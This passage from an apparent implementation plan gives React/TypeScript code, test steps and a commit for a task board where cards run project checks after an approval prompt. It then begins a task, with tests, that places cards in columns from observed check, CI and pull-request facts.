    void (answer !== undefined ? store.runCheck(room, card, name, answer) : store.runCheck(room, card, name))
      .then((answer) => {
        if (answer.kind === 'unseen') {
          setAsking({ card, unseen: answer.unseen })
          return
        }
        setAsking(null)
        setTrouble(null)
      })
      .catch((error: unknown) => {
        setAsking(null)
        setTrouble(error instanceof Error && error.message ? error.message : `${name} did not start on #${card}; nothing ran.`)
      })
      .finally(() => setStarting(false))
  }
```

5. Where the pane renders `<IntentCard … />`, after the `evidence=…` prop, add:

```tsx
                      checks={evidence ?? NO_CHECKS}
                      onRunCheck={(name) => runCheck(intent.id, name)}
```

6. Directly above `{handing && (`, add:

```tsx
      {asking && (
        <RunCheck
          unseen={asking.unseen}
          card={asking.card}
          busy={starting}
          onRun={() =>
            runCheck(asking.card, asking.unseen.check.name, { seen: asking.unseen.check.run, digest: asking.unseen.digest })
          }
          onCancel={() => setAsking(null)}
        />
      )}
```

7. In `IntentCard`, add `checks,` and `onRunCheck,` to the destructured props after `evidence,`, and to its props type after `evidence`:

```tsx
  /** The checks the room's project names: to run, refused, or none readable. */
  checks: BoardChecks
  onRunCheck: (name: string) => void
```

8. Delete the `menuOpen` state, its comment and its `useDismissOverlays(…)` call: the menu pattern's `Popover` closes itself when something takes the screen (#214).
9. After the `verbs` array, add:

```tsx

  /* The project's named checks, each a way to earn evidence for this card. A
     check that cannot run now stays in the menu, greyed, with why as its
     second line (the menu pattern's `disabled="…"`): one the file refuses, and
     every one while a check is running on this card — one runs on a card at a
     time, whatever its name, since two in one checkout would each measure the
     other's work. None on work set aside, which nothing is being checked for. */
  const busy = evidence?.running[0]?.name ?? null
  const checkItems: readonly { readonly key: string; readonly label: string; readonly why: string | null }[] =
    intent.state === 'abandoned'
      ? []
      : [
          ...checks.checks.map((name) => ({
            key: name,
            label: `Run ${name}`,
            why: busy === null ? null : `${busy} is running on this card, and one check runs on a card at a time`,
          })),
          ...checks.refused.map((one) => ({
            key: one.name,
            label: `Run ${one.name}`,
            why: `${CHECKS_FILE_WORDS} refuses it; the project's page says why`,
          })),
          ...(checks.unreadable ? [{ key: '', label: 'Run a check', why: `${CHECKS_FILE_WORDS} cannot be read` }] : []),
        ]
```

10. Replace the card's `actions` — the `DropdownMenu` and everything in it — with the menu pattern, whose rows carry their reasons:

```tsx
        actions={
          /* One primary, said as a button.
             ---------------------------------------------------------------
             This strip used to be a 44px-wide text field wearing a + and a
             `…`, and it was the wrong shape three times over. A field in a
             pane header reads as a *filter* — every other header in this app
             that carries one is searching what is below it — so the one
             control that adds work looked like the one control that hides
             it. It was also the only way in: the dialog that asks for the
             fields the host actually referees (the files a job owns, what it
             waits on, which goal it belongs to) hid behind an ellipsis
             inside the field, which is a button inside a text box and reads
             as a truncation. And a field cannot be the loudest thing on a
             header, so the board had no primary action at all.

             There is no quick path in a column any more: the columns are
             facts, and a derived board takes no title in one. What is here
             is what a header is for — the whole-board actions, with the loud
             one last, which is the order the reference draws and the order
             macOS reads. */
          <div className="flex items-center gap-1.5">
            {/* Offered only when both halves exist — a button that opens a
                dialog to say "nothing to hand out" is a button that lies about
                being useful. */}
            {openCards > 0 && (peers?.some((peer) => !peer.busy) ?? false) && (
              <Button
                size="sm"
                variant="outline"
                aria-label="Hand out the open cards"
                title="Hand out the open cards, one per idle member"
                onClick={() => setHanding(true)}
              >
                <HandoffIcon />
                Hand out
              </Button>
            )}
            <Button
              size="sm"
              /* The visible label leads the accessible one, because below
                 `26rem` the span is hidden and the glyph carries the button
                 alone — so it needs a name, and a name that *replaces* the
                 visible one breaks speech control and WCAG 2.5.3: "click New
                 job" has to match what is announced. */
              aria-label="New job — add work with files, dependencies and a goal"
              title="Add work with files, dependencies and a goal"
              onClick={() => openAdd(null)}
            >
              <PlusIcon />
              {/* The label goes at the narrowest width and the glyph carries
                  it, which is the one thing a pane header can give up without
                  losing the action. `@container/board` is on the pane. */}
              <span className="hidden @[26rem]/board:inline">New job</span>
            </Button>
          </div>
        }
      />
      <ToolPaneBody>
        {trouble && (
          <p className="mb-2 text-xs text-(--hd-danger-ink)" role="alert">
            {trouble}
          </p>
        )}
        {/* The goals on this board, above the work. A Room is permanent and a
            goal is not, so this is the only line that can ever say "finished" —
            and the refusal, when something is still live, is read here rather
            than thrown away, because it is an answer rather than a failure. */}
        {running.length > 0 && (
          <div className="mb-2 flex flex-wrap items-center gap-2">
            {running.map((plan) => {
              const live = intents.filter(
                (one: Intent) =>
                  one.plan === plan.id && one.state !== 'done' && one.state !== 'abandoned',
              ).length
              return (
                <span
                  key={plan.id}
                  className="flex items-center gap-2 rounded-(--hd-radius-sm) bg-(--hd-muted) px-2 py-1"
                >
                  <span className="text-xs font-medium">{plan.goal}</span>
                  <span className="text-xs text-(--hd-muted-foreground) tabular-nums">
                    {live > 0 ? `${live} live` : 'all done'}
                  </span>
                  {/* Work goes onto a goal from the goal itself: the one place
                      a reader is already thinking about that goal, and the only
                      way `plan` gets set without typing an id. */}
                  <Button
                    variant="muted"
                    size="xs"
                    title={`Add work to “${plan.goal}”`}
                    onClick={() => openAdd(plan.id)}
                  >
                    <PlusIcon />
                    Add
                  </Button>
                  <Button
                    variant="muted"
                    size="xs"
                    disabled={live > 0}
                    title={
                      live > 0
                        ? `${live} ${live === 1 ? 'job is' : 'jobs are'} still live on this goal`
                        : 'Put this goal away; its jobs stay as the record'
                    }
                    onClick={() => {
                      void store
                        .teamWrap(room, plan.id)
                        .then((answer) =>
                          setTrouble(answer.startsWith('Refused') ? answer : null),
                        )
                        .catch(() =>
                          setTrouble('The host did not take that; the board is as it was.'),
                        )
                    }}
                  >
                    Wrap up
                  </Button>
                </span>
              )
            })}
          </div>
        )}
        {intents.length === 0 ? (
          <EmptyState
            icon={<PlanIcon />}
            title="Nothing on the board"
            description="Work added here — by you, or by any agent that can reach the board — can be claimed by one conversation at a time, with its files owned while the claim lives."
          >
            <Button size="sm" className="self-center" onClick={() => openAdd(null)}>
              <PlusIcon />
              Add the first job
            </Button>
          </EmptyState>
        ) : (
          /* Wrapped, not scrolled: five fixed columns in a pane that gives its
             width up to the right dock and the rail. A scrolled board does not
             get shorter, it hides a column — and the first to go is Needs you,
             which is what the board was opened to find.

             Derived: the columns are facts, so no card is dragged, no column
             takes a drop or a title, and an empty column says so — the design
             system's `derived` board draws each of those itself. Work goes on
             through the header's door. */
          <Board wrap derived>
            {shown.map((column) => {
              const cards = byColumn.get(column.id) ?? []
              return (
                <BoardColumn key={column.id} title={column.title} count={cards.length} tint={column.tint}>
                  {cards.map((intent) => (
                    <IntentCard
                      key={intent.id}
                      intent={intent}
                      room={room}
                      placement={placed.get(intent.id) ?? null}
                      now={now}
                      attached={attached}
                      evidence={evidence?.cards.find((one) => one.card === intent.id)}
                      checks={evidence ?? NO_CHECKS}
                      onRunCheck={(name) => runCheck(intent.id, name)}
                      onOpenHolder={() => openHolder(intent)}
                      onAct={(verb, outcome) =>
                        verb === 'block' ? setStopping(intent) : act(intent.id, verb, undefined, outcome)
                      }
                    />
                  ))}
                </BoardColumn>
              )
            })}
          </Board>
        )}
      </ToolPaneBody>
      {stopping && (
        <StopWork
          intent={stopping}
          onClose={() => setStopping(null)}
          onStop={(reason) => {
            act(stopping.id, 'block', reason)
            setStopping(null)
          }}
        />
      )}
      {asking && (
        <RunCheck
          unseen={asking.unseen}
          card={asking.card}
          busy={starting}
          onRun={() =>
            runCheck(asking.card, asking.unseen.check.name, { seen: asking.unseen.check.run, digest: asking.unseen.digest })
          }
          onCancel={() => setAsking(null)}
        />
      )}
      {handing && (
        <HandOut
          room={room}
          intents={intents}
          peers={peers ?? []}
          onClose={() => setHanding(false)}
          onTrouble={setTrouble}
        />
      )}
      {detailed && (
        <AddWork
          room={room}
          plan={detailed.plan}
          plans={running}
          intents={intents}
          peers={peers ?? []}
          onClose={() => setDetailed(null)}
          onTrouble={setTrouble}
        />
      )}
    </ToolPane>
  )
}

/**
 * Stopping a job, and the one field that makes the Blocked column worth having.
 *
 * The column existed before this verb did: an agent could put work down with
 * `release(blocked)` and a reason, and a person could only *abandon* it —
 * which is a different sentence, and a permanent one. So a person who knew a
 * job should not be worked right now had to say something they did not mean.
 *
 * The reason is asked for rather than hoped for. A card in Blocked that does
 * not say what stopped it is a card the next reader has to go to the channel
 * about, which is the trip the whole board exists to save — and the drag that
 * lands here is exactly the moment the person knows the answer.
 */
const StopWork = ({
  intent,
  onClose,
  onStop,
}: {
  intent: Intent
  onClose: () => void
  onStop: (reason: string) => void
}) => {
  const [reason, setReason] = useState('')
  return (
    <Dialog
      title={`Stop #${intent.id}`}
      onClose={onClose}
      footer={
        <>
          <Button variant="default" onClick={() => onStop(reason)}>
            Stop it
          </Button>
          <Button variant="secondary" onClick={onClose}>Cancel</Button>
        </>
      }
    >
      <div className="flex flex-col gap-2">
        <p className="text-sm text-(--hd-muted-foreground)">
          “{intent.title}” goes to Blocked. Any claim on it is released, and a finished dependency
          will not start it again — only a deliberate reopen will.
        </p>
        <Input
          autoFocus
          aria-label="Why it is stopped"
          value={reason}
          placeholder="Waiting on the rename"
          onChange={(event) => setReason(event.target.value)}
          onKeyDown={(event) => {
            if (event.key === 'Enter') onStop(reason)
          }}
        />
        {/* Allowed through empty, and told what that costs. Refusing would put
            a modal between a person and a board they are allowed to change;
            saying nothing about it would produce the silent card this field
            exists to prevent. */}
        <p className="text-xs text-(--hd-muted-foreground)">
          {reason.trim()
            ? 'The card will say this, and so will the room.'
            : 'Without a reason the card says only that you stopped it.'}
        </p>
      </div>
    </Dialog>
  )
}

/**
 * One job, as a card.
 *
 * A card never repeats its own state — the column already said it, and that is
 * the whole claim a board makes over a list. What it does carry is everything
 * the column *cannot* say: who holds it, why it stopped, how long it has been
 * sitting there, and what it is waiting on.
 */
const IntentCard = ({
  intent,
  room,
  placement,
  now,
  attached,
  evidence,
  checks,
  onRunCheck,
  onOpenHolder,
  onAct,
}: {
  intent: Intent
  room: string
  /** The column its facts put it in, and why when the column cannot say. */
  placement: Placement | null
  /** The pane's clock, so a lease runs out on screen and not only on re-render. */
  now: number
  /** The host's peer list, as a predicate. `null` until it has answered. */
  attached: null | ((claim: { runtime: string; sessionId: string }) => boolean)
  /** What the desk observed on this card; undefined when nothing. */
  evidence: CardEvidence | undefined
  /** The checks the room's project names: to run, refused, or none readable. */
  checks: BoardChecks
  onRunCheck: (name: string) => void
  onOpenHolder: () => void
  /** `outcome` is what the person answered, on a card a flow addressed to them. */
  onAct: (verb: Verb, outcome?: string) => void
}) => {
  const snapshot = useSnapshot()

  /* The role this card was addressed to, as the running flow defines it — and
     only when one of that run's own rounds opened it: a card an earlier,
     stopped run left open is nobody's step now. A room with no flow has no
     entry here at all, which is every room that existed before flows — and
     then every branch below falls through to what the card has always drawn.
     The menu is the design system's `Popover` and `Menu`, which close
     themselves when something takes the screen (#214). */
  const role = useMemo(
    () =>
      flowRoleOf(
        intent,
        (snapshot.flowRuns.get(room) ?? []).find((one) => one.state === 'running' || one.state === 'stalled'),
      ),
    [intent, room, snapshot.flowRuns],
  )

  const runtime = intent.claim
    ? (snapshot.runtimes.find((one) => one.id === intent.claim?.runtime) ?? null)
    : null
  const session = intent.claim
    ? snapshot.sessions.get(sessionKey(intent.claim.runtime, intent.claim.sessionId as SessionId))
    : null
  const stranded = strandedFor(intent, now, attached)
  /* The board carries the names, so a card can say who holds it without
     fetching a roster — and without drawing "(untitled)" in the gap before an
     answer that may never come for a conversation nobody named. */
  const holder = intent.claim
    ? nicknameOf(snapshot.teams.get(room)?.nicknames, intent.claim)
    : undefined
  /* The holder by its *room name*. Reading the conversation's own title first
     and falling back to "(untitled)" — which is what an ACP conversation
     always is — put a live Cursor agent that had just claimed the job on the
     card as "(untitled) Cursor". The name the room gave it always exists. */
  const holderName = holder ?? session?.title ?? runtime?.presentation.name ?? '(untitled)'
  /* The holder's own ring, so the face on a card and the row in the rail are
     visibly the same account — see lib/accounts.ts on what the ring is for. */
  const holderTint = intent.claim
    ? runtimeTint(intent.claim.runtime, snapshot.accountsByRuntime, snapshot.accountPrefs)
    : 'blue'

  /**
   * The one line under the title, and the order is the order a reader needs it.
   *
   * Why it stopped outranks what it is: a card in Blocked that does not say
   * what blocked it sends the reader to the channel, which is the trip the
   * board exists to save. A finished card's note is the completion note the
   * next agent will read. Only when neither exists does the card fall back to
   * its own description.
   */
  const note =
    intent.blockedReason ??
    (intent.state === 'done' || intent.state === 'abandoned' ? intent.note : null) ??
    intent.detail ??
    null

  /* The referee's verbs. The user's word is final over any claim, which is why
     these are on every card rather than behind the holder — and why they are
     behind one glyph rather than spread across the foot: three ghost buttons
     cost the width the title needed, and named the same four actions on every
     card whether or not they applied. */
  const verbs: readonly {
    verb: Verb
    label: string
    danger?: boolean
    outcome?: string
  }[] = [
    /* A card a flow addressed to *the person* is a step, not an absence: the
       round opened, the loop is waiting, and what they answer is what the next
       rule branches on. So the menu offers the words the role declared rather
       than "Mark done", which would finish the card and leave the run with
       nothing to read. */
    ...(role?.kind === 'person' && intent.state !== 'done' && intent.state !== 'abandoned'
      ? role.outcomes.map((word) => ({
          verb: 'done' as const,
          label: `Answer ${word}`,
          outcome: word,
        }))
      : intent.state !== 'done' && intent.state !== 'abandoned'
        ? [{ verb: 'done' as const, label: 'Mark done' }]
        : []),
    ...(intent.state === 'claimed'
      ? [{ verb: 'release' as const, label: `Take it back off ${holderName}` }]
      : []),
    ...(intent.state === 'done' || intent.state === 'abandoned' || intent.state === 'blocked'
      ? [{ verb: 'reopen' as const, label: 'Put back in play' }]
      : []),
    /* Stopping is not finishing and not dropping: it says the work should not
       be worked *for now*, and only a deliberate reopen starts it again. It
       was an agent-only verb until the board grew a Blocked column the user
       could not put anything in. */
    ...(intent.state === 'open' || intent.state === 'claimed'
      ? [{ verb: 'block' as const, label: 'Stop it — say why' }]
      : []),
    /* Dropping work is not finishing it, and a board with only `Done` makes
       the reader lie to it to clear a card. Unclaimed work only: taking a card
       away from an agent mid-claim is `Release`. */
    ...(intent.state === 'open' || intent.state === 'blocked'
      ? [{ verb: 'abandon' as const, label: 'Abandon', danger: true }]
      : []),
  ]

  /* The project's named checks, each a way to earn evidence for this card. A
     check that cannot run now stays in the menu, greyed, with why as its
     second line (the menu pattern's `disabled="…"`): one the file refuses, and
     every one while a check is running on this card — one runs on a card at a
     time, whatever its name, since two in one checkout would each measure the
     other's work. None on work set aside, which nothing is being checked for. */
  const busy = evidence?.running[0]?.name ?? null
  const checkItems: readonly { readonly key: string; readonly label: string; readonly why: string | null }[] =
    intent.state === 'abandoned'
      ? []
      : [
          ...checks.checks.map((name) => ({
            key: name,
            label: `Run ${name}`,
            why: busy === null ? null : `${busy} is running on this card, and one check runs on a card at a time`,
          })),
          ...checks.refused.map((one) => ({
            key: one.name,
            label: `Run ${one.name}`,
            why: `${CHECKS_FILE_WORDS} refuses it; the project's page says why`,
          })),
          ...(checks.unreadable ? [{ key: '', label: 'Run a check', why: `${CHECKS_FILE_WORDS} cannot be read` }] : []),
        ]

  return (
    <BoardCard
      /* Not a handle: the column is the card's facts, so there is nowhere to
         drag it, and every verb is in the menu below. */
      title={
        <>
          <span className="font-(family-name:--hd-font-code) text-xs text-(--hd-muted-foreground)">
            #{intent.id}
          </span>{' '}
          {intent.title}
        </>
      }
      note={note}
      cover={
        intent.claim ? (
          <Button variant="subtle" size="row"
            type="button"
            onClick={onOpenHolder}
            /* Said once. With the conversation loaded, the card on the names
               says who holds this and opens it, and a native tooltip on the
               same rest stacks a second box on the card — so there the
               sentence is the description the platform *exposes* instead. With
               no card to show, it stays the tooltip.

               "Exposes" to the letter: what was measured is that Chromium 148
               reports `aria-description` and `title` alike as the button's
               description in the accessibility tree. What any one assistive
               technology then announces is its own business, and
               `aria-description` is still ARIA 1.3. */
            {...(session
              ? { 'aria-description': `Open the conversation ${holderName} is holding this in` }
              : { title: `Open the conversation ${holderName} is holding this in` })}
            className="flex w-full items-center gap-1.5 text-left"
          >
            {/* The face and the names, as one trigger: the holder is who a
                reader rests on, and the name is where they rest. A *session*
                card rather than a member's: the board knows which
                conversation holds this and nothing about the room's roster,
                and the one fact a member card would add — the job — is the
                card this holder is sitting on. Only when the conversation is
                open here; a claim by one this renderer has never loaded has
                nothing to report, and an invented card is worse than none —
                and then the three fall back into the button's own row, which
                lays them out the same. */}
            <SessionHoverCard
              session={session ?? null}
              className="flex min-w-0 flex-1 items-center gap-1.5"
              actions={[{ label: 'Open', primary: true, onSelect: onOpenHolder }]}
            >
              <IconTile size="sm" tint={holderTint}>
                {runtime ? (
                  <BrandMark brand={brandForRuntime(runtime) ?? 'openai'} size={12} />
                ) : (
                  <AgentIcon />
                )}
              </IconTile>
              {/* Two names, and neither is allowed to starve the other.
                  `flex-1` on the left with `shrink-0` on the right meant the
                  right one kept every pixel it asked for and the left one paid
                  for all of it — so a Cursor conversation called "checkout
                  tests" drew as `Curs… checkout tests`, with the *harness* cut
                  to four letters to make room for a title that is the less
                  important of the two. Half the row each, both truncating, is
                  the only split that cannot produce that: when either is short
                  the other takes the slack, and when both are long they lose
                  the same amount. */}
              <span className="min-w-0 flex-1 basis-1/2 truncate text-xs font-medium">
                {holderName}
              </span>
              {/* The conversation's own title, when it is not already the name
                  on the left. Compared against what is *drawn*, not against the
                  nickname: with no nickname the left falls back to the title,
                  and comparing to the nickname printed it twice. No tooltip of
                  its own, though it truncates: it is drawn only when the
                  conversation is loaded, so always inside the card's trigger,
                  and the card's heading is this title, with a card's width to
                  draw it in — a tooltip as well would be the second box on one
                  rest that the button's sentence stopped being. The whole of a
                  long one is in the conversation the button opens. */}
              {session?.title && session.title !== holderName && (
                /* And below a column width of about thirteen rems it is not
                   drawn at all. Half a row each is the right split while there
                   is a row to split; at 176px — five columns inside a room —
                   half of one is four letters, and `Gam… check…` tells a reader
                   neither of the two things it was trying to say. The column is
                   the container that decides, because the pane's width is not
                   the card's width on a board of five. */
                <span
                  className="hidden min-w-0 flex-1 basis-1/2 truncate text-right text-xs text-(--hd-muted-foreground) @[13rem]/board-column:inline"
                >
                  {session.title}
                </span>
              )}
            </SessionHoverCard>
          </Button>
        ) : undefined
      }
```

The existing tests reach the menu as before: its trigger is named `What to do with #N` (the `Popover`'s title, since its label is a glyph), and its rows are `[data-slot="dropdown-menu-item"]`, which the menu pattern's rows still are.

- [ ] **Step 6: The preview**

1. In `packages/ui/src/preview/harness.tsx`, add `type CheckUnseen,` to the import from `@harnessdesk/protocol` and `PREVIEW_UNSEEN` to the import from `./evidence-fixture`, and after `loadBoardEvidence = …` add:

```tsx
  /* Every run asks, so the question is one press away on the board. */
  runCheck = async (): Promise<{ readonly kind: 'unseen'; readonly unseen: CheckUnseen }> => ({
    kind: 'unseen',
    unseen: PREVIEW_UNSEEN,
  })
```

2. In `packages/ui/src/preview/main.tsx`, add `import { RunCheck } from '../components/RunCheck'` after the `EvidenceChips` import and `PREVIEW_UNSEEN` to the `./evidence-fixture` import; add `'run a check'` to the dial's type and `options`; and after the `'what was observed'` dialog add:

```tsx
      {dialog === 'run a check' && (
        <RunCheck unseen={PREVIEW_UNSEEN} card={2} busy={false} onRun={() => setDialog('off')} onCancel={() => setDialog('off')} />
      )}
```

- [ ] **Step 7: Run the tests to see them pass**

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/state/store.evidence.test.ts src/components/TeamBoardPane.test.tsx`
Expected: PASS — 5 tests, and every test in `TeamBoardPane.test.tsx` (six new).

Run: `pnpm test:ui-system run-check`
Expected: PASS — 3 tests in `run-check.spec.ts`.

- [ ] **Step 8: Prove the tests can fail**

Run each, watch the named test go red, and restore:

1. **Answer for the person.** In `runCheck`'s `then`, replace `setAsking({ card, unseen: answer.unseen })` with `runCheck(card, name, { seen: answer.unseen.check.run, digest: answer.unseen.digest })`: `a card offers each named check, and the first run… shows it and asks`, `Not now runs nothing…` and `a changed command asks again…` fail.
2. **Answer with nothing.** Change `onRun` to `() => runCheck(asking.card, asking.unseen.check.name)`: the first test fails on the answer carrying `{ seen: 'pnpm verify', digest }`. It fails the same way when the answer drops `digest`.
3. **Armed at once.** In `RunCheck`, pass `pending={false}`: the first test fails — the press the moment the question opened answered it — and so does `a click already on its way when the question opens answers nothing…` in `run-check.spec.ts`.
4. **Focused on open.** In `ConfirmDialog` (the design system's), drop `initialFocus={false}`: `a Return held from the press through the question opening answers nothing` fails because its opener no longer keeps focus. Restore it — this pins the question's requirement that nothing inside it takes focus. Merely counting answers is not enough here: Base UI now focuses the alert-dialog popup by default rather than the proceeding button, so a held Return still answers nothing while the focus contract has regressed.
5. **Allow a refused check.** Change `disabled={one.why ?? false}` to `disabled={false}`: `a check that cannot run stays in the menu, greyed, with its reason as its second line` and `while a check runs on a card…` fail.
6. **No lock on the card.** Change `why: busy === null ? null : …` to `why: null`: `while a check runs on a card, every check on that card waits…` fails.

Then run the preview, choose *run a check* on the dial — the question shows `pnpm lint --max-warnings 0` and, under it, `pnpm lint` — and:

```bash
node script/design-audit.mjs --strict
pnpm test:ui-system
```

Expected: the audit's findings unchanged, every UI-system spec passing.

- [ ] **Step 9: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/ui/src/components/RunCheck.tsx packages/ui/src/components/TeamBoardPane.tsx packages/ui/src/components/TeamBoardPane.test.tsx packages/ui/src/state/store.ts packages/ui/src/state/store.evidence.test.ts packages/ui/src/preview/harness.tsx packages/ui/src/preview/main.tsx script/check-reachable.mjs e2e/ui-system/run-check.spec.ts
git commit -m "feat(evidence): a card runs its project's checks, and asks first

Each card's menu — now the menu pattern — offers Run <check>; one the file
refuses, and every one while a check runs on the card, stays greyed with why
as its second line. The first run of a command this Mac has not approved
shows it verbatim — where it runs, the file it came from, what ran before
when it changed — says it runs with your full authority, as in your
terminal, and runs only when the verb is pressed, answering with exactly the
text and the file generation shown. Nothing in the question is focused, and
its verb is disarmed for a moment, so neither a held Return nor a click
already on its way runs anything; a real-browser spec pins both.
TeamBoardPane.test.tsx's rig gains runCheck.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 18: Where a card belongs, from the facts

The rule the board's columns are drawn from, on its own and tested alone: *To do*, *Working*, *Needs you*, *In review*, *Ready* — and *Set aside* — each from a card's state and what the desk observed on it, never from what anyone said. A card that cannot move without a person says which fact put it in *Needs you*, in a few words that fit the chip a card wears.

The spec's rules, each pinned:

- **Ready only on a current fact** that says the work is good: a fresh passing check, fresh passing CI, or a merged pull request that is fresh — or `final`, its branch gone after the merge (Task 3). A merged pull request is no exception otherwise: out of date or unknown, it is no verdict. A fact a backup brought is unknown (Task 10), so it never makes a card *Ready*.
- **Cancelled CI is not passing.** Alone or beside passes, it puts the card in *Needs you* as *CI cancelled*.
- **Abandoned work never reaches *Ready*.** It is *Set aside*: settled, never good news, whatever was observed on it — a column of its own, drawn only while it holds a card (Task 19).
- **Every fact that could decide a card says which, and how,** when it does not: *verify out of date*, *verify unknown*, *CI out of date*, *CI unknown*, *PR #12 out of date*, *PR #12 unknown*. A stale diff decides nothing, so it says nothing.
- **A flow addresses a card to the person** only when one of the running flow's own rounds opened it for a person's role (`flowRoleOf`): a card an earlier, stopped run left open is nobody's step because a new run reuses its role's name.

**Files:**
- Create: `packages/ui/src/lib/board-facts.ts`
- Test: `packages/ui/src/lib/board-facts.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `checkPassed`, `ciVerdict`, `isCurrent` (Task 15); `Intent`, `CardEvidence`, `EvidenceView`, `FlowRun`, `FlowRole` (`@harnessdesk/protocol`).
- Produces: `type FactColumn = 'todo' | 'working' | 'needs' | 'review' | 'ready' | 'aside'`; `FACT_COLUMNS: readonly { id: FactColumn; title: string }[]`; `interface Placement { column: FactColumn; why: string | null }`; `interface PlaceInput { intent; evidence; stranded; holderWaits; forPerson }`; `flowRoleOf(intent: Intent, run: FlowRun | undefined): FlowRole | null`; `placeCard(input): Placement`.

- [ ] **Step 1: Write the failing tests**

Create `packages/ui/src/lib/board-facts.test.ts`:

```ts
import { describe, expect, it } from 'vitest'

import { runtimeId, type FlowRun, type Intent } from '@harnessdesk/protocol'

import { cardEvidence, checkView, ciView, diffView, prView } from '../preview/evidence-fixture'
import { flowRoleOf, placeCard, type PlaceInput } from './board-facts'

/*
 * Where a card belongs, from the facts. A column moves on a check, a diff, a
 * pull request or CI — never on anybody saying the work is done.
 */

const intent = (over: Partial<Intent> = {}): Intent => ({
  id: 1,
  title: 'Retry the checkout call on a 502',
  detail: null,
  state: 'done',
  files: [],
  dependsOn: [],
  claim: null,
  blockedReason: null,
  handoff: null,
  note: null,
  createdAt: 1,
  updatedAt: 1,
  ...over,
})

const place = (over: Partial<PlaceInput> = {}) =>
  placeCard({ intent: intent(), evidence: undefined, stranded: false, holderWaits: false, forPerson: false, ...over })

const HELD = { runtime: runtimeId('alpha'), sessionId: 'c1', at: 1 }

describe('work that is not finished', () => {
  it('nobody has started is To do; its holder is on it is Working', () => {
    expect(place({ intent: intent({ state: 'open' }) })).toEqual({ column: 'todo', why: null })
    expect(place({ intent: intent({ state: 'blocked', blockedBy: 'graph', dependsOn: [2] }) })).toEqual({ column: 'todo', why: null })
    expect(place({ intent: intent({ state: 'claimed', claim: HELD }) })).toEqual({ column: 'working', why: null })
  })

  it('anything that cannot move without a person Needs you, and says why', () => {
    expect(place({ intent: intent({ state: 'blocked', blockedBy: 'hand', blockedReason: 'waits on the rename' }) })).toEqual({ column: 'needs', why: 'stopped' })
    expect(place({ intent: intent({ state: 'claimed', claim: HELD }), stranded: true })).toEqual({ column: 'needs', why: null })
    expect(place({ intent: intent({ state: 'claimed', claim: HELD }), holderWaits: true })).toEqual({ column: 'needs', why: 'waiting on you' })
    expect(place({ intent: intent({ state: 'open' }), forPerson: true })).toEqual({ column: 'needs', why: 'needs your answer' })
  })
})

describe('finished work, on its facts', () => {
  it('is Ready on a current fact that says it is good: a fresh passing check, fresh passing CI, a merged pull request', () => {
    expect(place({ evidence: cardEvidence(1, [checkView()]) })).toEqual({ column: 'ready', why: null })
    expect(place({ evidence: cardEvidence(1, [ciView(['passed', 'skipped'])]) })).toEqual({ column: 'ready', why: null })
    expect(place({ evidence: cardEvidence(1, [prView('merged')]) })).toEqual({ column: 'ready', why: null })
    // Merged, and its branch gone after: the last word, and current for that.
    expect(place({ evidence: cardEvidence(1, [prView('merged', { freshness: { state: 'final' } })]) })).toEqual({ column: 'ready', why: null })
  })

  it('a merged pull request is no exception: out of date or unknown, it is no verdict', () => {
    expect(place({ evidence: cardEvidence(1, [prView('merged', { freshness: { state: 'behind', commits: 1 } })]) })).toEqual({ column: 'needs', why: 'PR #12 out of date' })
    expect(place({ evidence: cardEvidence(1, [prView('merged', { freshness: { state: 'unknown', why: 'its checkout is gone' } })]) })).toEqual({ column: 'needs', why: 'PR #12 unknown' })
  })

  it('cancelled CI is not a pass, alone or beside passes', () => {
    expect(place({ evidence: cardEvidence(1, [ciView(['cancelled'])]) })).toEqual({ column: 'needs', why: 'CI cancelled' })
    expect(place({ evidence: cardEvidence(1, [ciView(['passed', 'cancelled', 'passed'])]) })).toEqual({ column: 'needs', why: 'CI cancelled' })
  })

  it('a fact a backup brought is unknown here, and never makes a card Ready', () => {
    const brought = checkView({ freshness: { state: 'unknown', why: 'it came from a backup, and this desk has not observed it' } })
    expect(place({ evidence: cardEvidence(1, [brought]) })).toEqual({ column: 'needs', why: 'verify unknown' })
  })

  it('a fresh failure outranks anything that passed, and names itself', () => {
    expect(place({ evidence: cardEvidence(1, [checkView({ exit: 1 }), ciView(['passed'])]) })).toEqual({ column: 'needs', why: 'verify failed' })
    expect(place({ evidence: cardEvidence(1, [ciView(['passed', 'failed'])]) })).toEqual({ column: 'needs', why: 'CI failed' })
    expect(place({ evidence: cardEvidence(1, [prView('closed')]) })).toEqual({ column: 'needs', why: 'PR #12 closed' })
  })

  it('is In review while its evidence is still arriving', () => {
    expect(place({ evidence: cardEvidence(1, [], [{ name: 'verify', since: 1 }]) })).toEqual({ column: 'review', why: 'verify running' })
    expect(place({ evidence: cardEvidence(1, [ciView(['passed', 'pending'])]) })).toEqual({ column: 'review', why: 'CI running' })
    expect(place({ evidence: cardEvidence(1, [prView('open'), diffView()]) })).toEqual({ column: 'review', why: 'PR #12 open' })
  })

  it('a pass that has gone stale is not a pass: the card waits for the check to run again', () => {
    const stale = cardEvidence(1, [checkView({ freshness: { state: 'behind', commits: 1 } })])
    expect(place({ evidence: stale })).toEqual({ column: 'needs', why: 'verify out of date' })
    // And fresh again when it re-runs.
    expect(place({ evidence: cardEvidence(1, [checkView()]) }).column).toBe('ready')
  })

  it('every fact that could decide a card says which it is, and how it stands, when it is not current', () => {
    const behind = { state: 'behind', commits: 2 } as const
    const unknown = { state: 'unknown', why: 'its checkout is gone' } as const
    expect(place({ evidence: cardEvidence(1, [checkView({ freshness: unknown })]) })).toEqual({ column: 'needs', why: 'verify unknown' })
    expect(place({ evidence: cardEvidence(1, [ciView(['passed'], { freshness: behind })]) })).toEqual({ column: 'needs', why: 'CI out of date' })
    expect(place({ evidence: cardEvidence(1, [ciView(['passed'], { freshness: unknown })]) })).toEqual({ column: 'needs', why: 'CI unknown' })
    expect(place({ evidence: cardEvidence(1, [prView('open', { freshness: behind })]) })).toEqual({ column: 'needs', why: 'PR #12 out of date' })
    expect(place({ evidence: cardEvidence(1, [prView('open', { freshness: unknown })]) })).toEqual({ column: 'needs', why: 'PR #12 unknown' })
    // A diff decides nothing, so a stale one says nothing: the card has nothing checked.
    expect(place({ evidence: cardEvidence(1, [diffView({ freshness: behind })]) })).toEqual({ column: 'needs', why: 'nothing checked' })
  })

